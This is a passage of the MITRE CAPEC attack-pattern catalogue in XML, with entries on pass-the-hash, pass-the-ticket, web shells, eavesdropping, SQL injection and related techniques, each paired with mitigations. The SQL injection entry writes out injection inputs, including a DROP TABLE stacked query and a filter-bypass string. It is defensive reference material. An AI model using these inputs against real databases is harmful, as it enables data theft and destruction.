         <Description>An adversary uses stolen hash values for a user's credentials (username and password) to access systems managed under the same credential framwork that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. When authenticating via LM or NTLM, the hashed credentials' associated plaintext credentials are not requried for successful authentication. Therefore, if an adversary can obtain the hashed credentials of a user, he can then pass these hash values to the server or service to authenticate without needing to brute-force the hashes to obtain their cleartext values. The adversary can then impersonate the user and laterally move within the network. This technique can be performed against any operating system which leverages the LM or NTLM protocols.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="560"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary needs to first obtain the hashed credentials of a user, via the use of a tool, prior to executing this attack.</Prerequisite>
            <Prerequisite>The victim system must allow Lan Man or NT Lan Man authentication.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Determine if Lan Man and NT Lan Man authentication is allowed on the server.</Skill>
            <Skill Level="High">The adversary uses a third-party tool to obtain hashed credentials to execute the attack.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.</Mitigation>
            <Mitigation>Monitor system and domain logs for abnormal credential access.</Mitigation>
            <Mitigation>Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1075</Entry_ID>
               <Entry_Name>Pass The Hash</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="645" Name="Use of Captured Tickets (Pass The Ticket)" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses stolen Kerberos tickets to access systems that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="560"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary needs physical access to the victim system.</Prerequisite>
            <Prerequisite>The use of a third-party credential harvesting tool.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Determine if Kerberos authentication is used on the server.</Skill>
            <Skill Level="High">The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.</Mitigation>
            <Mitigation>Monitor system and domain logs for abnormal access.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1097</Entry_ID>
               <Entry_Name>Pass The Ticket</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="646" Name="Peripheral Footprinting" Abstraction="Detailed" Status="Stable">
         <Description>Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary needs either physical or remote access to the victim system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The adversary needs to be able to infect the victim system in a manner that gives him remote access.</Skill>
            <Skill Level="Medium">If analyzing the Windows registry, the adversary must understand the registry structure to know where to look for devices.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1120</Entry_ID>
               <Entry_Name>Peripheral Device Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="647" Name="Collect Data from Registries" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).</Prerequisite>
            <Prerequisite>The adversary must have capability to navigate the operating system to peruse the registry.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The adversary is able to read sensitive information about the system in the registry.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.</Mitigation>
            <Mitigation>Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="285"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1012</Entry_ID>
               <Entry_Name>Query Registry</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1214</Entry_ID>
               <Entry_Name>Credentials in Registry</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="648" Name="Collect Data from Screen Capture" Abstraction="Detailed" Status="Draft">
         <Description>An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only to leverage the relevant command for screen capture.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The adversary is able to capture potentially sensitive information and processes as they appear on the screen.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting tools.</Mitigation>
            <Mitigation>While screen capture is a legitimate and practical function, certain situations and context may require the disabling of this feature.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="267"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1113</Entry_ID>
               <Entry_Name>Screen Capture</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="649" Name="Adding a Space to a File Extension" Abstraction="Detailed" Status="Draft">
         <Description>An adversary adds a space character to the end of a file extension and takes advantage of an application that does not properly neutralize trailing special elements in file names. This extra space, which can be difficult for a user to notice, affects which default application is used to operate on the file and can be leveraged by the adversary to control execution.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="635"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The use of the file must be controlled by the file extension.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>File extensions should be checked to see if non-visible characters are being included.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="46"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1151</Entry_ID>
               <Entry_Name>Space after Filename</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="65" Name="Sniff Application Code" Abstraction="Detailed" Status="Draft">
         <Description>An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="37"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Set up a sniffer</xhtml:div>
                  <xhtml:p>The attacker sets up a sniffer in the path between the server and the client and watches the traffic.</xhtml:p>
               </Description>
               <Technique>The attacker sets up a sniffer in the path between the server and the client.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Capturing Application Code Bound During Patching</xhtml:div>
                  <xhtml:p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</xhtml:p>
               </Description>
               <Technique>Attacker loads the sniffer to capture the application code bound during a dynamic update.</Technique>
               <Technique>The attacker proceeds to reverse engineer the captured code.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker must have the ability to place himself in the communication path between the client and server.</Prerequisite>
            <Prerequisite>The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.</Prerequisite>
            <Prerequisite>The attacker must be able to employ a sniffer on the network without being detected.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ a man-in-the-middle attack, the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>The Attacker needs the ability to capture communications between the client being updated and the server providing the update.</xhtml:p>
               <xhtml:p>In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Encrypt all communication between the client and server.</Mitigation>
            <Mitigation>Implementation: Use SSL, SSH, SCP.</Mitigation>
            <Mitigation>Operation: Use "ifconfig/ipconfig" or other tools to detect the sniffer installed in the network.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..</Example>
            <Example>Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="319"/>
            <Related_Weakness CWE_ID="311"/>
            <Related_Weakness CWE_ID="318"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="719"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Passively Sniff and Capture Application Code Bound for Authorized Client</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="650" Name="Upload a Web Shell to a Web Server" Abstraction="Detailed" Status="Draft">
         <Description>By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a "gateway" to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.</xhtml:p>
               <xhtml:p>Insure that the file permissions in directories on the web server from which files can be execute is set to the "least privilege" settings, and that those directories contents is controlled by a whitelist.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
            <Related_Weakness CWE_ID="553"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1100</Entry_ID>
               <Entry_Name>Web Shell</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="651" Name="Eavesdropping" Abstraction="Standard" Status="Draft">
         <Description>An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="117"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>The adversary gains unauthorized access to information.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Be mindful of your surroundings when discussing sensitive information in public areas.</Mitigation>
            <Mitigation>Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.</Mitigation>
            <Mitigation>If possible, physically disable the microphone on your machine if it is not needed.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="66" Name="SQL Injection" Abstraction="Standard" Status="Draft">
         <Description>This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input. When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to talk directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database. In order to successfully inject SQL and retrieve information from a database, an attacker:</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey application] The attacker first takes an inventory of the functionality exposed by the application.</Description>
               <Technique>Spider web sites for all available links</Technique>
               <Technique>Sniff network communications with application using a utility such as WireShark.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.</Description>
               <Technique>Use web browser to inject input through text fields or through HTTP GET parameters.</Technique>
               <Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</Technique>
               <Technique>Use network-level packet injection tools such as netcat to inject input</Technique>
               <Technique>Use modified client (modified by reverse engineering) to inject input.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.</Description>
               <Technique>Use public resources such as "SQL Injection Cheat Sheet" at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.</Technique>
               <Technique>Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : "' OR 1=1; --", or something else that would syntactically complete a hypothesized query. Iteratively refine the query.</Technique>
               <Technique>Use "Blind SQL Injection" techniques to extract information about the database schema.</Technique>
               <Technique>If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: "'; DROP TABLE SYSOBJECTS; --" and "'); DROP TABLE SYSOBJECTS; --". These particular queries will likely not work because the SYSOBJECTS table is generally protected.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.</Description>
               <Technique>Craft and Execute underlying SQL query</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>SQL queries used by the application to store, retrieve or modify data.</Prerequisite>
            <Prerequisite>User-controllable input that is not properly validated by the application as part of SQL queries.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Too many false or invalid queries to the database, especially those caused by malformed input.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.</Mitigation>
            <Mitigation>Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.</Mitigation>
            <Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a blacklist approach to input validation. However, because of improper blacklisting, it is possible to inject content such as "foo'/**/UNION" or "foo UNION/**/" to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="89"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Execution_Flow</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="67" Name="String Format Overflow in syslog()" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the format string vulnerabilities in the syslog() function. An attacker would typically inject malicious input in the format string parameter of the syslog function. This is a common problem, and many public vulnerabilities and associated exploits have been posted.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker finds that he can inject data to the format string parameter of Syslog().</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker craft a malicious input and inject it into the format string parameter. From now on, the attacker can execute arbitrary code and do more damage.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The format string argument of the Syslog function can be tainted with user supplied data.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
